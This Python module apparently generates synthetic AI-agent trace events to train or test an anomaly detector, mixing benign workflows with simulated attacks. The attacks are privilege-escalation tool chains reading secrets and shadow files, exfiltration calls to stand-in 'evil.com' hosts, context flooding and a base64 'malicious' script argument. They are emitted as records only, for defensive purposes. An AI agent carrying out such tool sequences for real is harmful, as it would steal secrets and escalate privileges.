import uuid
import time
import random
import logging
from src.schema.trace import TraceEvent, ToolArgsShape
from src.ingest.kafka_producer import TraceProducer

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SyntheticAgent:
    def __init__(self, producer: TraceProducer):
        self.producer = producer

    def emit(self, session_id: uuid.UUID, event_type: str, tool_name: str = None, 
             prev_tool: str = None, latency_ms: int = None, 
             context_delta: int = None, raw_args: dict = None):
            
        event = TraceEvent(
            session_id=session_id,
            actor="synthetic_agent_v2",
            event_type=event_type,
            tool_name=tool_name,
            raw_args=raw_args,
            latency_ms=latency_ms or random.randint(100, 800),
            prev_tool=prev_tool,
            context_window_delta=context_delta or random.randint(10, 100)
        )
        self.producer.produce_event(event)
        time.sleep(0.1) # Simulate network/processing delay

    def run_workflow_1(self):
        """Workflow 1: Simple Info Retrieval (search -> reasoning -> output)"""
        session_id = uuid.uuid4()
        logger.info(f"Starting Workflow 1 for session {session_id}")
        
        self.emit(session_id, "tool_call", tool_name="search_kb", raw_args={"query": "how to connect to db"})
        self.emit(session_id, "reasoning_step", prev_tool="search_kb")
        self.emit(session_id, "output", prev_tool="reasoning_step")
        
    def run_workflow_2(self):
        """Workflow 2: Data Aggregation (query_db -> query_db -> reasoning -> output)"""
        session_id = uuid.uuid4()
        logger.info(f"Starting Workflow 2 for session {session_id}")
        
        self.emit(session_id, "tool_call", tool_name="query_db", raw_args={"table": "users", "limit": 10})
        self.emit(session_id, "tool_call", tool_name="query_db", prev_tool="query_db", raw_args={"table": "orders", "limit": 10})
        self.emit(session_id, "reasoning_step", prev_tool="query_db", context_delta=500)
        self.emit(session_id, "output", prev_tool="reasoning_step")
        
    def run_workflow_3(self):
        """Workflow 3: Iterative refinement (read_file -> reasoning -> edit_file -> output)"""
        session_id = uuid.uuid4()
        logger.info(f"Starting Workflow 3 for session {session_id}")
        
        self.emit(session_id, "tool_call", tool_name="read_file", raw_args={"path": "/etc/hosts"})
        self.emit(session_id, "reasoning_step", prev_tool="read_file")
        self.emit(session_id, "tool_call", tool_name="edit_file", prev_tool="reasoning_step", raw_args={"path": "/etc/hosts", "content": "test"})
        self.emit(session_id, "output", prev_tool="edit_file")

    def run_attack_t1(self):
        """Attack T1: Privilege-escalation chaining"""
        session_id = uuid.uuid4()
        logger.warning(f"Starting ATTACK T1 for session {session_id}")
        signatures = [
            ["list_users", "assume_role", "read_secrets"],
            ["get_token", "assume_role", "dump_db"],
            ["sudo_su", "read_shadow"]
        ]
        sig = random.choice(signatures)
        prev = None
        for t in sig:
            self.emit(session_id, "tool_call", tool_name=t, prev_tool=prev, raw_args={"target": f"res_{random.randint(1,1000)}"})
            prev = t
        self.emit(session_id, "output", prev_tool=prev)
        
    def run_attack_t2(self):
        """Attack T2: Data exfil via tool combo"""
        session_id = uuid.uuid4()
        logger.warning(f"Starting ATTACK T2 for session {session_id}")
        signatures = [
            ("read_db", "http_post"),
            ("query_db", "http_post"),
            ("read_file", "ftp_upload"),
            ("get_s3_object", "send_email")
        ]
        t1, t2 = random.choice(signatures)
        self.emit(session_id, "tool_call", tool_name=t1, raw_args={"table": f"data_{random.randint(1,100)}"})
        # Direct exfil without reasoning step
        self.emit(session_id, "tool_call", tool_name=t2, prev_tool=t1, context_delta=random.randint(1000, 5000), raw_args={"url": f"http://evil{random.randint(1,99)}.com"})
        
    def run_attack_t3(self):
        """Attack T3: Latency side-channel probing (repeated calls with high latency variance)"""
        session_id = uuid.uuid4()
        logger.warning(f"Starting ATTACK T3 for session {session_id}")
        for i in range(5):
            # Normal baseline latency is 100-800, here we simulate a spike to 5000+
            latency = 5000 + random.randint(100, 500) if i == 3 else random.randint(100, 200)
            self.emit(session_id, "tool_call", tool_name="check_access", latency_ms=latency, raw_args={"resource": "admin_panel"})

    def run_attack_t4(self):
        """Attack T4: Context-window flooding"""
        session_id = uuid.uuid4()
        logger.warning(f"Starting ATTACK T4 for session {session_id}")
        signatures = [
            ("generate_report", "inject_payload"),
            ("read_logs", "execute_command"),
            ("summarize_history", "run_sql")
        ]
        t1, t2 = random.choice(signatures)
        self.emit(session_id, "tool_call", tool_name=t1, context_delta=random.randint(10, 200))
        # Massive spike in context delta to flood window
        self.emit(session_id, "tool_call", tool_name=t2, prev_tool=t1, context_delta=random.randint(50000, 95000))
        self.emit(session_id, "output", prev_tool=t2)

    def run_attack_t5(self):
        """Attack T5: Argument entropy anomaly"""
        session_id = uuid.uuid4()
        logger.warning(f"Starting ATTACK T5 for session {session_id}")
        # Normal baseline calls
        for _ in range(random.randint(2, 5)):
            self.emit(session_id, "tool_call", tool_name="run_script", raw_args={"script_name": f"task_{random.randint(1,10)}.sh"})
        # Anomalous highly-entropic call with some noise to make it unique
        noise = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=random.randint(10, 50)))
        b64_payload = ("UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAIAAAAdGVzdC50eHTLz0/JyVcozy/KSVEEAECNwYELAAAA" * 5) + noise
        self.emit(session_id, "tool_call", tool_name="run_script", raw_args={"script_name": f"malicious_{random.randint(1,99)}.sh", "payload": b64_payload})

if __name__ == "__main__":
    producer = TraceProducer()
    agent = SyntheticAgent(producer)
    
    logger.info("Running synthetic workflows...")
    agent.run_workflow_1()
    agent.run_workflow_2()
    agent.run_workflow_3()
    
    logger.info("Running attack injections (50 total)...")
    for _ in range(10):
        agent.run_attack_t1()
        agent.run_attack_t2()
        agent.run_attack_t3()
        agent.run_attack_t4()
        agent.run_attack_t5()
    
    producer.flush()
    logger.info("Done.")
